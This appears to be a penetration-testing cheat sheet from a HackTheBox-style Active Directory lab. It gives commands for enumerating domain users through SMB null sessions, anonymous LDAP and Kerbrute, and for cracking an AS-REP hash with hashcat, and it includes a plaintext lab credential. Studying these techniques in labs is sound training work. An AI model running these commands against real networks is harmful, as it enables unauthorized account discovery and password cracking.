

# **SMB NULL Session to Pull User List**

### **Using enum4linux**

```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### **Using rpcclient**
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers
```

### **Using CrackMapExec --users Flag**

```bash
crackmapexec smb 172.16.5.5 --users
```


# **Gathering Users with LDAP Anonymous**
### **Using ldapsearch**

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

### **Using windapsearch**

```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


# **Enumerating Users with Kerbrute**

We will use the wordlist [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) to enumerate users
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

## **Credentialed Enumeration to Build our User List**

### **Using CrackMapExec with Valid Credentials**

```bash
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```


# Cracking the kerburtue hash

- Paste the hash
```txt
`$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:fb90f01... (rest of the hash)`
```
- Crack it
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt 

# `--force` → only if needed (e.g., with GPU driver error
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```